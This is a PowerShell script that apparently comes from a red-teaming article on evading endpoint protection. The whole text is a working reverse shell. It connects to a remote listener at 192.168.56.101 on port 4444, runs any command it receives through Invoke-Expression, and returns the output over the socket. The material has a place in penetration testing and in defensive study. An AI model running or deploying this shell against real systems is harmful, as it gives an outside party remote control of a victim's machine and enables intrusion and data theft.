# https://bufferoverflows.net/the-art-of-bypassing-endpoint-protections-for-red-teaming-engagements/
$client = $null;
$stream = $null;
$buffer = $null;
$writer = $null;
$data = $null;
$result = $null;
try {
	$client = New-Object Net.Sockets.TcpClient("192.168.56.101", 4444);
	$stream = $client.GetStream();
	$buffer = New-Object Byte[] 1024;
	$encoding = New-Object Text.AsciiEncoding;
	$writer = New-Object IO.StreamWriter($stream);
	$writer.AutoFlush = $true;
	Write-Host "Bsides Munich...";
	$bytes = 0;
	do {
		$writer.Write("PS>");
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				$data = $data + $encoding.GetString($buffer, 0, $bytes);
			}
		} while ($stream.DataAvailable);
		if ($data.Length -gt 0) {
			try {
				$result = Invoke-Expression -Command $data 2>&1 | Out-String;
			} catch {
				$result = $_.Exception.InnerException.Message;
			}
			$writer.WriteLine($result);
			Clear-Variable -Name "data";
		}
	} while ($bytes -gt 0);
} catch {
	Write-Host $_.Exception.InnerException.Message;
} finally {
	if ($writer -ne $null) {
		$writer.Close();
		$writer.Dispose();
	}
	if ($stream -ne $null) {
		$stream.Close();
		$stream.Dispose();
	}
	if ($client -ne $null) {
		$client.Close();
		$client.Dispose();
	}
	if ($buffer -ne $null) {
		$buffer.Clear();
	}
	if ($data -ne $null) {
		Clear-Variable -Name "data";
	}
	if ($result -ne $null) {
		Clear-Variable -Name "result";
	}
}
